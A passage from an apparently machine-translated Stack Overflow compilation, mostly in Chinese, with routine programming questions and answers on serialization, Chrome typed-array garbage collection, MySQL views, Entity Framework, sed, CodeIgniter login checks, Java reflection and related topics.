[有关维基百科的](http://en.wikipedia.org/wiki/Serialization)更多信息

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2021-06-27T07:11:40.720

`Designing Data Intensive Applications`从书中引用：

> 程序通常以（至少）两种不同的表示形式处理数据：
> 
> 1.  在内存中，数据保存在对象、结构、列表、数组、哈希表、树等中。这些数据结构针对 CPU 的高效访问和操作进行了优化（通常使用指针）。
> 2.  当您想将数据写入文件或通过网络发送时，您必须将其编码为某种自包含的字节序列（例如，JSON 文档）。由于指针对任何其他进程都没有意义，因此这种字节序列表示看起来与通常在内存中使用的数据结构完全不同。因此，我们需要在两种表示之间进行某种转换。从内存中的表示到字节序列的转换称为编码（也称为序列化或编组），反向称为解码（解析、反序列化、解组）。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-08-03T07:27:49.843

序列化是将对象转换为流的过程，以便可以将其保存在任何物理文件中，例如（XML）或可以保存在数据库中。C#中序列化的主要目的是持久化一个对象并将其保存在任何指定的存储介质中，如流、物理文件或数据库。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-07T12:29:32.493

一般来说，序列化是一种保持对象状态的方法，但我建议你阅读这个 wiki 页面，我认为它非常详细和正确：

[http://en.wikipedia.org/wiki/Serialization](http://en.wikipedia.org/wiki/Serialization)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2021-10-02T10:59:30.843

在序列化中，重点不是将对象转换为位和字节，对象已经是位和字节。序列化是使对象的“状态”持久化的过程。注意“状态”这个词，它表示**整个对象图**（目标对象和它直接或间接引用的所有对象）的实例变量的值，没有方法和其他额外的运行时东西粘在它们上面（当然还有JVM 恢复这些对象所需的更多信息，例如它们的类类型）。

所以这是它必要的主要原因：**存储对象的整个字节会很昂贵，而且出于所有意图和目的，都是不必要的。**

# javascript - Chrome中类型化数组的Javascript垃圾收集

> ID：12318103
> 
> 赞同：6
> 
> 时间：2012-09-07T12:27:58.843
> 
> 标签：javascript, google-chrome, garbage-collection

请考虑以下javascript。我原以为循环中的分配将允许垃圾收集来防止堆溢出。它在 Firefox 中这样做是正确的，但是在 Chrome（在 OSX 上测试）中，该片段在多次迭代后会导致打开的选项卡崩溃。

```
 for (var i = 0; i < 1024; ++i) {
            // Allocate a 16mb buffer
            var buffer = new Float32Array(1024*1024*4);

            // Try to explicitly mark it for free by either
            delete buffer;
            // or
            buffer = null;

            console.log(i);
    } 
```

这个脚本本身并没有那么有用。但我正在尝试优化我的 Javascript 应用程序，以使其使用更少的内存。因此，我想听听您的意见。这是 Chrome 中的错误吗？您是否知道在代码执行期间显式调用垃圾收集的任何解决方法（在 FF 和 IE 中它们似乎存在）？谢谢！

* * *

编辑：Chrome Inspector 上似乎存在一个名为“收集垃圾”的按钮。它是检查器“时间轴”面板下栏上的第 7 个按钮。这不是表示存在从 Javascript 调用 GC 的方法吗？毕竟，Inspector 的一部分不是用 Javascript 编写的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:59:06.910

这纯粹是推测，但我想知道垃圾收集是否被推迟到运行循环上的当前项目完成执行。

如果是这样，那么如果你把它塑造成这样，也许它会起作用：

```
var i = 0;
function allocateArray() {
    var buffer = new Float32Array(1024*1024*4);
    if (++i < 1024) {
        setTimeout(allocateArray, 0); // Post the next call to the run loop
    }
}
allocateArray(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-10T10:02:21.217

As far as i know, calling GC doesn't work. You can explicitely call it e.g. in Chrome, but you need to have some debug option enabled, so that's not an option for the finished program.

Here's a Chromium bug about typed arrays not being garbage collected correctly. [https://code.google.com/p/chromium/issues/detail?id=232415](https://code.google.com/p/chromium/issues/detail?id=232415)

I personally have a program right now, where typed arrays are causing huge performance loss in Chrome and minor performance loss in other browsers.

I guess creating new typed arrays frequently should be avoided.(at the current time)

If someone knows more than me on this topic, i would really appreciate it.

# mysql - 有没有办法创建 SQL “别名”？

> ID：12318105
> 
> 赞同：2
> 
> 时间：2012-09-07T12:28:04.193
> 
> 标签：mysql

如果有一个我想多次执行的复杂查询，有没有办法将它存储为“别名”？例如，存储：

```
SELECT 
    table_schema "Data Base Name", 
    SUM( data_length + index_length) / 1024 / 1024 "Data Base Size in MB" 
FROM information_schema.TABLES 
GROUP BY table_schema ; 
```

作为

```
GET_DB_SIZES 
```

有这样的可能吗？？？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-07T12:30:28.450

是的，创建一个`VIEW`：

```
CREATE VIEW GET_DB_SIZES AS <your query>; 
```

那么你就可以：

```
SELECT * FROM GET_DB_SIZES; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-07T12:31:14.783

一种选择是将结果集放在临时表中并进一步使用

# asp.net - 启用 Code First Entity Framework VS Web Express 2012

> ID：12318107
> 
> 赞同：13
> 
> 时间：2012-09-07T12:28:10.513
> 
> 标签：asp.net, entity-framework, visual-studio-2012, entity-framework-migrations

我正在尝试在我的 Visual Studio Web Express 2012 中启用 Code First。从我目前阅读的内容来看，我必须使用包管理器控制台和命令 Enable-Migrations。当我这样做时，我收到以下错误。

```
Exception calling "LoadFrom" with "1" argument(s): "Could not load file or assembly 'file:///E:\Working\wingtoysdl\C#\packages\EntityFramework.5
.0.0\tools\EntityFramework.PowerShell.Utility.dll' or one of its dependencies. Operation is not supported. (Exception from HRESULT: 0x80131515)"
At E:\Working\wingtoysdl\C#\packages\EntityFramework.5.0.0\tools\EntityFramework.psm1:398 char:62
+     $utilityAssembly = [System.Reflection.Assembly]::LoadFrom <<<< ((Join-Path $toolsPath EntityFramework.PowerShell.Utility.dll))
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException

You cannot call a method on a null-valued expression.
At E:\Working\wingtoysdl\C#\packages\EntityFramework.5.0.0\tools\EntityFramework.psm1:399 char:50
+     $dispatcher = $utilityAssembly.CreateInstance <<<< (
    + CategoryInfo          : InvalidOperation: (CreateInstance:String) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull

Exception calling "CreateInstanceFrom" with "8" argument(s): "Could not load file or assembly 'file:///E:\Working\wingtoysdl\C#\packages\EntityF
ramework.5.0.0\tools\EntityFramework.PowerShell.dll' or one of its dependencies. Operation is not supported. (Exception from HRESULT: 0x80131515
)"
At E:\Working\wingtoysdl\C#\packages\EntityFramework.5.0.0\tools\EntityFramework.psm1:431 char:31
+     $domain.CreateInstanceFrom <<<< (
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException 
```

如您所见，这是一个非常大的错误，因此很难通过 Google 搜索和排除故障。有人对我如何解决这个问题有任何想法吗？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-02-21T04:14:00.640

我已经两次遇到这个问题了。两次我都必须卸载实体框架，然后为解决方案中的每个项目重新安装它。我花了一段时间才弄清楚第二次这样做的一件事是，我必须在重新安装实体框架后重新启动 Visual Studio (2012)（或者我继续收到“无法加载文件或程序集” [路径]\packages\EntityFramework.5 .0.0\tools\EntityFramework.PowerShell.Utility.dll'”错误）。

要进入包管理器控制台，请转到：*工具 -> 库包管理器 -> 包管理器控制台*

在包管理器中为每个项目卸载实体框架（我从包管理器控制台顶部的默认项目下拉列表中选择了每个项目）：
**Uninstall-Package EntityFramework -Force**

然后为每个项目安装它：
**Install-Package EntityFramework**

此时尝试运行 Enable-Migrations 命令仍然出现错误，直到我关闭并重新启动 Visual Studio。然后它成功了，Update-Database 命令也是如此（在 Migrations.Configuration 文件中将 AutomaticMigrationsEnabled 设置为 true 之后）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-01-30T08:57:55.563

在网络驱动器上使用项目时，在两台不同的机器上遇到了同样的问题。[这个](https://stackoverflow.com/a/8535963/415652)答案为我解决了这个问题。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-07T22:59:21.647

这可能是一个迟到的答案，但这似乎是一个权限/访问问题。确保您的项目没有从映射驱动器或类似驱动器打开。

如果您在公司网络上并登录到域，那么您的用户配置文件很可能实际上并不位于您的本地计算机上，而是位于服务器上。这将导致同样的问题。

尝试将项目复制到本地 c: 并重试。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-10-15T17:58:05.787

我的问题是由于我的解决方案中的某些项目未更新到与其他项目相同的版本引起的。当我确保所有人都在同一个 EF 版本上时，它就开始工作了。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-03-07T13:31:29.287

所以我有一段时间遇到同样的问题，我正在解压一个工作项目并在尝试启用迁移时遇到错误。它只是通过使用 7-Zip 而不是 Windows 10 的默认解压缩器来修复的

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2021-04-05T11:20:25.810

我也遇到了同样的问题，所以我开始检查可能出现的问题，我发现以某种方式安装了 2 个不同版本的实体框架。

要确认我转到工具> NuGet 包管理器解决方案> 管理 NuGet 包> 合并。

看看下面的图片。

[![在此处输入图像描述](../Images/3ff31d3e667fa1fbb76c7dd78bcb2256.png)](https://i.stack.imgur.com/8iRNY.png)

在这张图片中你可以清楚地看到安装了不同的版本

[![在此处输入图像描述](../Images/75315050982c025e2c367391ebd3018d.png)](https://i.stack.imgur.com/EhPFA.png)

在这张照片中，我同意将实体框架从 6.2.0 更新到 6.4.4

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-01-07T16:20:56.560

我有同样的问题，在我的情况下是网络驱动器问题。当我在本地驱动器中复制我的项目时，它工作正常。

# css - 给 CSS :after content 一个类

> ID：12318110
> 
> 赞同：1
> 
> 时间：2012-09-07T12:28:14.447
> 
> 标签：css

我只是想知道是否可以为 :after 伪元素添加的内容分配一个 CSS 类。像这样的东西：

```
span:after {
  content: "after!"
  class: red
} 
```

我知道您可以指定几个样式属性，例如字体大小等，所以我可以想象应用一个类也应该是可能的。

实际上，我正在尝试以这种方式通过引导 CSS 附加一个字形图标。但是一个简单的

```
span:after {
  class: icon-wrench
} 
```

没做。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-07T12:31:51.413

伪元素不能有类。您只能将单个样式规则直接应用于它们。也没有办法将样式从某个类的真实元素复制到其伪元素，除非您特别选择它，例如`span.icon-wrench:after`.

# json - 一个用于多种类型的杰克逊反序列化器（通过注释配置）

> ID：12318114
> 
> 赞同：1
> 
> 时间：2012-09-07T12:28:23.647
> 
> 标签：json, jackson, deserialization

我正在尝试更改我的一个课程中列表的（反）序列化。

列表中的对象应序列化为 int（它们的 jpa id）并相应地反序列化。序列化很简单。

对于反序列化，如果 id 和 class 已知，我有一个可以将 id 转换为对象的类。

我如何从杰克逊那里获得必要的课程？所有默认的杰克逊序列化器都有这样的构造函数：`protected StdDeserialiser(Class<?> vc)`因此信息存在于某处。

有没有办法在反序列化期间访问它？还是在杰克逊构造解串器之前？还是在 HandlerInstantiator 内部？

我只想覆盖某些引用的默认解串器，所以我不能只编写提供程序或自定义模块。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-11T09:49:04.607

我在 ContextDeserializer 接口的帮助下从反序列化器内部工作，因为它为反序列化器提供目标属性。

```
public JsonDeserializer<?> createContextual(DeserializationContext ctxt, BeanProperty property) throws JsonMappingException {
    Class<?> vc = null;
    if (property.getType().isCollectionLikeType()) {
        vc = property.getType().getContentType().getRawClass();
    } else {
        vc = property.getType().getRawClass();
    }
    return new ResourcePathDeserializer(vc, converter);
} 
```

这个解决方案并不完美，因为我只得到返回类型的原始类或泛型（可能是父类或接口），但这足以满足我的要求。如果我可以访问杰克逊解决的“真实”课程会更好，但对我来说这是可行的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T19:54:09.053

首先，编写模块没有什么花哨的：它只是一种插入东西的方式，比如自定义（反）序列化器。所以没有必要避免这种情况。你最喜欢写一个模块来做你想做的事。

一般来说，尝试创建“通用”序列化器或反序列化器不是一个好主意，它可能会遇到问题。但这取决于您到底要做什么。

类型信息将是：

*   从上下文中隐含：您正在为类型 T 编写（反）序列化程序，并为它注册它，所以这就是您的类型
*   Jackson 在构造（反）序列化器时通过`Module`接口传递：询问模块是否碰巧有类型 T 的（反）序列化器。`SimpleModule`将仅使用基本的类到实现的映射（这就是“简单”的来源); 但完全自定义`Module`可以访问传入类型。

但我不知道上面是否适用于您的用例。类型信息必须可从静态类型（列表的声明内容类型）中获得。

# .net - C++ .NET 声明变量

> ID：12318116
> 
> 赞同：0
> 
> 时间：2012-09-07T12:28:26.440
> 
> 标签：.net, visual-c++, c++-cli

我刚刚开始使用 VC++。我正在使用 .NET 4，但我不知道在哪里可以声明全局变量。

[这](http://pastebin.com/xTU36gfU)是自动创建的简单代码。我在哪里可以声明变量？

将所有变量放在另一个 .ha 中是个好主意吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:30:04.050

您可以尝试使用此代码

```
int g_nX; // global variable

void Main()
{
    int nY; // local variable nY

    // global vars can be seen everywhere in program
    // so we can change their values here
    g_nX = 5;
} // nY is destroyed here 
```

# r - 在 r 中的 ggplot 的绘图区域内添加表格

> ID：12318120
> 
> 赞同：58
> 
> 时间：2012-09-07T12:28:37.783
> 
> 标签：r, plot, ggplot2

我想在 ggplot 中添加一个突出显示站点的坐标表。

使用上一个[问题](https://stackoverflow.com/questions/11467965/r-ggplot2-highlighting-selected-points-and-strange-behavior)作为示例数据：

```
set.seed(1)
mydata <- data.frame(a=1:50, b=rnorm(50))
ggplot(mydata,aes(x=a,y=b)) + 
    geom_point(colour="blue") + 
    geom_point(data=mydata[10:13, ], aes(x=a, y=b), colour="red", size=5) 
```

![在此处输入图像描述](../Images/5b1c9768494c81c8e4d43ecbf2889223.png)

我想将下表添加到绘图区域内绘图的右下角。有什么建议吗？

```
table<-cbind(sites=c("site 1","site 2","site 3","site 4"),mydata[10:13,])
table

    sites  a          b
    site 1 10 -0.3053884
    site 2 11  1.5117812
    site 3 12  0.3898432
    site 4 13 -0.6212406 
```

* * *

## 回答 #1

> 赞同：93
> 
> 时间：2012-09-07T12:57:07.090

您可以将`ggplot2`'s `annotation_custom`与包中的 a 一起`tableGrob`使用`gridExtra`。

```
library(ggplot2)
library(gridExtra)
set.seed(1)
mydata <- data.frame(a=1:50, b=rnorm(50))
mytable <- cbind(sites=c("site 1","site 2","site 3","site 4"),mydata[10:13,])
k <- ggplot(mydata,aes(x=a,y=b)) + 
  geom_point(colour="blue") + 
  geom_point(data=mydata[10:13, ], aes(x=a, y=b), colour="red", size=5) + 
  annotation_custom(tableGrob(mytable), xmin=35, xmax=50, ymin=-2.5, ymax=-1) 
```

![在此处输入图像描述](../Images/5c4803c3019879543e98a1b8249d3b76.png)

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2018-07-24T15:36:37.190

随着['ggplot2'](https://cran.r-project.org/package=ggplot2) 3.0.0 和['ggpmisc'](https://cran.r-project.org/package=ggpmisc) 0.3.0 的发布，一个新的更简单的答案是可能的：

```
library(ggplot2)
library(ggpmisc)

set.seed(1)
mydata <- data.frame(a = 1:50, b = rnorm(50))
table <- cbind(sites=c("site 1", "site 2", "site 3", "site 4"), mydata[10:13, ])

ggplot(mydata, aes(x = a, y = b)) + 
  geom_point(colour = "blue") + 
  geom_point(data = mydata[10:13, ], aes(x = a, y = b), colour = "red", size = 5) +
  annotate(geom = "table", x = 37, y = -0.8, label = list(table), 
           vjust = 1, hjust = 0) 
```

'ggplot2' 3.0.0 完全支持小标题（请参阅[发布公告](https://www.tidyverse.org/articles/2018/07/ggplot2-3-0-0/)），从而可以将数据框列表映射到`label`美学。'ggpmisc 0.3.0' 包中的新`geom_table()`功能利用了这一点，使得添加的表的语法与`geom_label()`可能的相似（请参阅[文档](https://docs.r4photobiology.info/ggpmisc/reference/geom_table.html)）。这里似乎最适合添加表格作为注解，但当然`geom_table()`也可以直接使用，作为其他`ggplot`几何图形。

[![在此处输入图像描述](../Images/a38587fb2885e02119c33c86572a7b7f.png)](https://i.stack.imgur.com/uNY2n.png)

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2017-05-22T20:21:00.270

@user3206440，@Punintended 存在删除行号的简单方法：添加`rows = NULL`到对`tableGrob`.

```
library(ggplot2)
library(gridExtra)
set.seed(1)
mydata <- data.frame(a=1:50, b=rnorm(50))
mytable <- 
   cbind(sites=c("site 1","site 2","site 3","site 4"), mydata[10:13,])
k <- ggplot(mydata,aes(x=a,y=b)) + 
  geom_point(colour="blue") + 
  geom_point(data=mydata[10:13, ], aes(x=a, y=b), colour="red", size=5) + 
  annotation_custom(tableGrob(mytable, rows=NULL), 
                    xmin=35, xmax=50, ymin=-2.5, ymax=-1) 
```

[![绘图图像](../Images/99dfd184effcdb5b6e30b6f3b31e84dc.png)](https://i.stack.imgur.com/qHNp8.png)

请参阅[gridExtra Wiki](https://github.com/baptiste/gridextra/wiki/tableGrob)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-03-06T19:48:36.973

@user3206440：我找到了一个删除行号的解决方法。我将数据格式化为矩阵，分配列名，然后让 tableGrob 直接调用它。每当我让 tableGrob 将其称为数据框时，行名都会保留。

下面是一个例子。我确信有一种更简单的方法来处理 chisq.test 输出

```
chivalues <- chisq.test(chitable)
chidf <- matrix(c(unlist(c(round(as.numeric(chivalues[1]), 2),
                    chivalues[2], round(as.numeric(chivalues[3]), 5), numcells))),
                   nrow = 1, ncol = 4, byrow = FALSE)
colnames(chidf) <- c("Chi-Squared", "DF", "P Value", "Total Cells") 
```

然后后来...

```
annotation_custom(tableGrob(chidf), xmin=2, xmax=6, ymin=700, ymax=800) 
```

# c# - DatagridView 中的选择起始行

> ID：12318123
> 
> 赞同：-2
> 
> 时间：2012-09-07T12:28:47.970
> 
> 标签：c#

我正在使用 Windows DataGridView，在这个网格中我允许多行选择。

当我检查它时，`dataGridView1.SelectedRows[0].Index`它给出了最后选择的行索引。只是我想要选择从哪一行开始（开始行）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:37:57.647

您可以尝试使用此代码

```
Int32 selectedRowCount = 
        dataGridView1.Rows.GetRowCount(DataGridViewElementStates.Selected);
dataGridView1.SelectedRows[selectedRowCount - 1 ].Index.ToString(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:19:35.937

您可以使用 foreach 循环来检查最低索引行。因为 SelectedRows 集合中的行是在您选择行时按顺序添加的。

这是完整的foreach循环..

```
 int i=int.MaxValue;
        foreach (DataGridViewRow rw in dataGridView1.SelectedRows)
        {
            if (rw.Index < i)
            {
                i = rw.Index;
            }
        }

        DataGridViewRow r = dataGridView1.Rows[i]; 
```

它将返回您最低索引的选定行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:42:13.897

您可以尝试使用类似的东西

```
dataGridView1.SelectedRows[dataGridView1.SelectedRows.Count - 1].Index 
```

但从我的角度来看，`SelectedRows`无论如何，选择顺序都不是应该依赖的。据我所知，[文档](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridview.selectedrows.aspx)没有指定任何特定的顺序......如果这对您的应用程序很重要，您应该自己做一些事情。

# linux - 附加到前几行的开头和结尾

> ID：12318125
> 
> 赞同：2
> 
> 时间：2012-09-07T12:28:54.710
> 
> 标签：linux, bash, sed

什么 sed 命令允许我在每一行的末尾附加一个字符串，在第一行的开头附加一个不同的字符串，在第五行的末尾附加一个不同的字符串？

到目前为止我有

```
 sed 's/$/<br>/' $FILE1 >> $FILE1_GETS_APPENDED_TO_THIS_FILE 
```

将 html break 语句附加到 file1 中每一行的末尾。不过，我需要在前 5 行周围添加一个标题语句。因此，第一行的开头需要`<h3>`附加到它，第五行的结尾需要附加到`</h3>`它。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T12:41:32.840

就这么简单：

```
sed 's/$/<br>/; 1 s/^/<h3>/; 5 s/$/<\/h3>/' 
```

当您使用`$`匹配行尾时，使用`^`匹配行首。

然后，对于您的每个命令（例如`s`），您可以指定它应该应用的行号（或范围）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:41:28.637

在 sed 命令之前添加一个数字以将其仅应用于该行。添加以逗号分隔的两个数字以指定行号范围。`$`代表最后一行。有关更多信息，请参阅 sed 手册中的“地址”。

```
sed -e '1 s/^/<h3>/' -e '5 s/$/<\/h3>/' -e '6,$ s/$/<br>/' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T12:45:10.323

我喜欢 awk 的这种东西：

```
awk 'NR==1{print "<h3>"};{print $0, "<br>"};NR==5{print "</h3>"}' file.htm 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T12:41:25.947

查看`sed`手册中的“地址”。您可以指定应应用命令的行号：

```
sed '5s/$/Appended after fifth line/' 
```

# entity-framework - 实体框架多对多保存

> ID：12318126
> 
> 赞同：0
> 
> 时间：2012-09-07T12:28:58.360
> 
> 标签：entity-framework

我有以下数据库表： 操作参数 OperationToParameter（对以前的表有 2 个外键，两个外键也都声明为 PK）

我从 DB 更新了我的 EF 模型。它创建了我的操作和参数实体，它创建的 OperationToParameter 作为我需要的多对多关系的 2 个表之间的关联。问题是当我尝试执行 SaveChanges 时（我更改的对象是 ParameterDefinition 具有导航到操作和参数实体）它抛出异常 - 无法更新 EntitySet '[Table Name]' 因为它有一个 DefiningQuery 并且不存在元素这 。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-25T07:49:17.273

这可能是因为您的表没有主键

# google-apps-marketplace - 在市场中获取域用户列表

> ID：12318130
> 
> 赞同：0
> 
> 时间：2012-09-07T12:29:18.413
> 
> 标签：google-apps-marketplace

单击立即添加按钮后，我们需要显示域用户。如何在 Java 中显示用户列表

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T12:52:20.533

这就是你要找的：

[https://developers.google.com/google-apps/profiles/](https://developers.google.com/google-apps/profiles/)

> Profiles Data API 允许客户端应用程序检索和更新 Google Apps 域中用户的个人资料信息。每个用户配置文件都存储在拥有用户的 Google 帐户中，但只能由用户域的管理员进行修改。

# codeigniter - CodeIgniter 用户身份验证

> ID：12318131
> 
> 赞同：3
> 
> 时间：2012-09-07T12:29:24.347
> 
> 标签：codeigniter, login

我已经成功地使用代码点火器对用户进行了身份验证，但是现在如果用户在我的一个控制器中输入一个方法的路由，他们可以在不登录的情况下访问它。

我想停止对没有登录的用户进行这种访问，最好不使用第 3 方用户身份验证插件。

我有这个模型代码：

```
function login(){
    $data = array(
        'username' => $this->input->post('username'),
        'logged_in' => TRUE
    );
    $this->session->set_userdata($data);
} //function login()
function logged_in(){
    if($this->session->userdata('logged_in') == TRUE)
    {
        return TRUE;
    }
    return FALSE;
} //function logged in() 
```

我有这个控制器代码：

```
 function index($condition = FALSE){
    if($this->admin_model->logged_in() === TRUE)
    {
        $this->books_page(TRUE);
    }
    else
    {
        $data = $this->style_model->admin_area();
        $data['page_intro'] = 'Oops! Sorry, you must be logged in to view this page.';
        $this->load->view('admin/not_logged_in', $data);
    }
} //function index()
    function books_page(){
        $data = $this->style_model->admin_area();
        $data['category_query'] = $this->admin_books_model->get_book_categories();
        $data['page_title'] = 'Books';
        $data['query'] = $this->admin_books_model->get_books();         
        $this->load->view('admin/books/books_admin', $data);
    }    //function books_page() 
```

尚未登录的用户无法访问书籍方法，但在此之后他们可以访问任何其他方法，我只是想停止该访问并将错误页面传递给他们，通知他们必须登录。

在此先感谢，汤姆

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T12:36:41.887

最好的方法是将您的逻辑拆分为两个（或更多）控制器。

*   一个“前端”控制器——用户不需要登录任何一个
*   一个“后端”控制器 - 用户必须在其中登录所有控制器

在您的后端控制器中执行此操作

```
class Backend extends CI_Controller 
{
    public function  __construct()
    {
        parent::__construct();
        if( ! ($this->admin_model->logged_in())
        {
            // Not logged in - so force them away
            redirect ('place login page here');
       }
    }
 } 
```

然后`backend`控制器中的所有内容都受到保护。

为了进一步了解这个概念 - 研究使用 a`MY_Controller`并让你的所有后端控制器都从这里扩展。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:38:10.780

要么我误解了你的问题，要么解决方案非常简单。

```
function books_page() {
   if(!$this->admin_model->logged_in()) {
      redirect('auth/login'); ## OR $this->load->view("error_page"); exit();
   }
   ## All your code, etc.
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T12:38:45.490

我会像这样在控制器顶部声明一个变量：

```
private $logged_in = false; 
```

然后在构造函数中我会像这样初始化它：

```
$this->logged_in = $this->session->userdata('logged_in'); 
```

然后您可以禁用对所需方法的访问（如果您将检查放入构造函数，则可以禁用完整的控制器）：

```
if($this->logged_in)
{
   //do stuff
}
else
{
   redirect(base_url().'login');
} 
```

# java - java反射-如何获取特定属性的名称

> ID：12318132
> 
> 赞同：4
> 
> 时间：2012-09-07T12:29:23.900
> 
> 标签：java, class, reflection, properties

我有一个关于java反射的问题。

我需要某种方法来获取java 类中**特定字段的名称。**可以像这样工作的东西：

```
class X{
   int x;

   String getNameOfProperty(Object o){
         ....
   } 
} 
```

然后，当调用

```
System.out.println(getNameOfProperty(x)); 
```

我想得到“x”；

我已经设法使用

```
X.class.getDeclaredFields(); 
```

但是我在属性和与之关联的 Field 对象之间没有任何链接。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T12:36:05.480

您可以为此目的使用抽象语法树。对于 Eclipse，您可以在[此处](http://www.vogella.com/articles/EclipseJDT/article.html#jdt_ast)找到详细信息。

您还可以使用以下

- [ANTLR](http://www.antlr.org/)

-java[解析器](http://code.google.com/p/javaparser/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:42:20.233

真的不清楚你想在这里问什么。

如果我正确理解了您的问题`Field`，java 中的类允许您在运行时获取该字段的对象值。`getDeclaredFields`还给你`Field[]`。

[http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/reflect/Field.html](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/reflect/Field.html)

检查`get(Object o)`方法

> 返回指定对象上此字段表示的字段的值。如果该值具有原始类型，则该值会自动包装在对象中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:44:46.910

我认为您可以在 java.lang.reflect.Field 类中使用 getName() 。在您的问题中，您的代码中已经包含了很多字段

考虑 core.Test1 类中的这段代码。对 fieldName 的调用将返回 'i' 和 'd' 以及 42 和 6。（不是我在这里使用 getDouble 并且 int 适合 Dboule ，所以没有问题。您可能需要检查您要查找的字段的类型获得 first 的值。）

这就是你所追求的吗？

```
private int i = 42;
private double d = 6.0d;

@Test
public void test() {
    try {
        Class<?> clazz = Class.forName("core.Test1");

        Field[] fieldlist = clazz.getDeclaredFields();
        for (int i  = 0; i < fieldlist.length; i++) {
           System.out.println("field name = " + fieldlist[i].getName());
           System.out.println("value = " + fieldlist[i].getDouble(this));
           System.out.println("field type  = " + fieldlist[i].getType());
           System.out.println("modifiers = " +  Modifier.toString(fieldlist[i].getModifiers()));
        }
      }
      catch (Throwable e) {
         System.err.println(e);
      }
} 
```

# jquery - jQuery- 动画在 Google Chrome 中无法正常工作

> ID：12318135
> 
> 赞同：2
> 
> 时间：2012-09-07T12:29:37.453
> 
> 标签：jquery

请在 Firefox 和 Chrome 中查看：

[http://jsfiddle.net/enne87/AwGfs/1/](http://jsfiddle.net/enne87/AwGfs/1/)

如果单击文本，文本应该会通过一个简单的 slideToggle() 动画消失。如果您在 FF 中执行此操作，效果很好，但在 Chrome 中，它会在背景图像中创建工件。我希望你们中的某个人能描述我做错了什么。

非常感谢，

安内

编辑：我也在 Safari 中以相同的行为尝试过这个。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:52:54.593

我认为这与您使用 jquery 设置 css 而不是使用样式标签以老式方式进行设置的事实有关。我能够得到一个非常干净的动画：

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>AG-App!</title>
    <script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.8.23/jquery-ui.min.js">    </script>
    <script type="text/javascript" src="js/main.js"></script>
    <script type="text/javascript">
    </script>
    <style type="text/css">
      body { background: #ffffff url('http://advancedata.ad.funpic.de/bg.png') no-repeat left top; background-attachment: scroll; background-size: 100%;}        
    </style>  
</head>
<body>

    <div>
      <p id="test">Click here to see that<br />in chrome this is going to <br /> create artifacts.</p>
    </div>

</body>
</html> 
```

我还从 div 中获取了 id 并将文本放入带有该 id 的自己的“p”标签中，仅仅是因为您需要隐藏文本，而不是 div 本身。我还使用了来自 google apis 的更新的 jquery 库。希望这可以帮助。​</p>

这是我的示例[http://jsfiddle.net/AwGfs/29/](http://jsfiddle.net/AwGfs/29/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:02:15.193

问题似乎与`background-position`. 当我将其更改为绝对值时，它会起作用。另外，如果我将它添加到@jcalabris 的代码中，问题就会出现：http: [//jsfiddle.net/AwGfs/30/](http://jsfiddle.net/AwGfs/30/)

我建议绝对将背景定位为一种解决方法。

您还应该在[Chrome](http://crbug.com)或[WebKit](http://bugs.webkit.org) bugtracker 中报告它。

# spring-security - Spring security - 在并发登录时重定向到 expiredUrl

> ID：12318142
> 
> 赞同：-1
> 
> 时间：2012-09-07T12:30:03.633
> 
> 标签：spring-security

我有类似的问题...当并发登录问题发生时，我想重定向到“/concurrent.htm?concurrencyError=true”。

配置如下：

> ```
>  <beans:bean id="concurrencyFilter"
>   class="org.springframework.security.web.session.ConcurrentSessionFilter" >
